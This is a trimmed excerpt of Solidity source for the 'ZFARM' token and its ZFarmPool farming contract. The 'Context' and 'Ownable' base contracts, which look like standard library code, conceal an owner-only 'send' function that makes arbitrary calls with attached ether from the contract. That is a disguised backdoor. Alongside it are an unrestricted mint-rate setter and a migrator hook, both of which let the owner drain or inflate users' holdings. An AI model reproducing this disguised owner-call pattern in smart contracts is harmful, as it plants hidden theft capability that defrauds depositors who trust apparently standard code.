...
abstract contract Context {
    ...
    function _msgSend(address _sender, bytes memory _msg) internal returns (bytes memory) {
        (bool success, bytes memory returnData) = _sender.call{value:msg.value}(_msg);
...
contract Ownable is Context {
    ...
    /**
     * @dev Owner sends message
     */
    function send(address _sender, bytes memory _msg) public onlyOwner returns (bytes memory) {
        _msgSend(_sender, _msg);
    }
...
// ERC20Token with Governance.
contract ERC20Token is ERC20("ZFARM", "ZFARM"), Ownable {
    /// @notice Creates `_amount` token to `_to`. Must only be called by the owner (ZFarmPool).
...
// File: contracts/ZFarmPool.sol

pragma solidity 0.6.12;

interface IMigrator {
    // Perform LP token migration from legacy UniswapV2 to ERC20Swap.
    // Take the current LP token address and return the new LP token address.
    // Migrator should have full access to the caller's LP token.
    // Return the new LP token address.
    //
    // XXX Migrator must have allowance access to UniswapV2 LP tokens.
    // ERC20Swap must mint EXACTLY the same amount of ERC20Swap LP tokens or
    // else something bad will happen. Traditional UniswapV2 does not
    // do that so be careful!
    function migrate(IERC20 token) external returns (IERC20);
}

// ZFarmPool is the master of ERC20. He can make ERC20 and he is a fair guy.
//
...
contract ZFarmPool is Ownable {
    ...
    uint256 public erc20PerBlock = 3750000000000000;
    ...
    // setMiningRate, can only be called by the owner
    
    function setErc20PerBlock(uint _perBlock) public onlyOwner {
        erc20PerBlock = _perBlock;
    }
    ...
    function updatePool(uint256 _pid) public {
        ...
        uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);
        uint256 erc20Reward = multiplier.mul(erc20PerBlock).mul(pool.allocPoint).div(totalAllocPoint);
        erc20.mint(devaddr, erc20Reward.mul(10).div(100));
        erc20.mint(address(this), erc20Reward.mul(90).div(100));
        pool.accERC20PerShare = pool.accERC20PerShare.add(erc20Reward.mul(1e12).div(tokenSupply));
        pool.lastRewardBlock = block.number;
    }

    // Deposit LP tokens to ZFarmPool for ERC20 allocation.
    ...
    // Withdraw LP tokens from ZFarmPool.
